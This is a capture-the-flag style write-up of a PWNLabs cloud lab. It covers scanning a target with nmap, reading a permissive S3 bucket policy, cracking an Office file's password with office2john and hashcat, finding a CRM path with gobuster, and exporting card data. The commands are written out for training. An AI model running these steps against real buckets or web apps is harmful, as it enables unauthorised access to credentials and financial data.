# Cloud Privilege Abuse Simulation – Huge Logistics (PWNLabs)

This repository documents the exploitation of weak S3 bucket policies, misconfigured IAM access, and cloud privilege escalation within a controlled PWNLabs environment.

## 🔥 Overview
Target IP: **13.43.144.61**  
Hosted service: Node.js Express on port **3000**

Static assets reveal an S3 bucket: **hugelogistics-data**  
The bucket policy allows any authenticated AWS user to download sensitive objects.

## 🛠️ Attack Steps
### 1. Scan Target
nmap -Pn -sC -sV --top-ports=1000 13.43.144.61

### 2. AWS CLI Setup
aws configure

### 3. Bucket Policy Enumeration
aws s3api get-bucket-policy --bucket hugelogistics-data | jq -r '.Policy'

Revealed misconfiguration allows downloading:
- backup.xlsx  
- background.png

### 4. Extract & Crack Credentials
office2john backup.xlsx > lab.txt  
hashcat -m 9600 lab.txt rockyou.txt

Cracked password: **summertime**

### 5. Web Enumeration
gobuster dir -u http://13.43.144.61:3000/ -w directory-list-lowercase-2.3-medium.txt  
Discovered: `/crm`

### 6. CRM Login & Data Extraction
Using cracked credentials, login → Export Data → Credit card leakage.

## 🧩 Privilege Abuse Log
| Attack ID | Service | Misconfiguration | Notes |
|-----------|---------|------------------|-------|
| 01 | AWS S3 | Overly permissive bucket policy | Allowed download of sensitive XLSX file. |
| 02 | IAM | Weak credential storage | Encrypted file contained crackable credentials. |
| 03 | Web App | Exposed admin features | CRM allowed export of sensitive invoice data. |

## 📝 50-Word Summary
A misconfigured S3 bucket exposed encrypted credentials that were easily cracked, enabling unauthorized access to an internal CRM portal. Weak IAM and web app controls allowed privilege escalation, revealing sensitive personal and financial information. This highlights how small cloud policy gaps can create major security breaches.

## ⚠️ Legal Notice
All actions documented were performed inside an authorized PWNLabs training environment only.
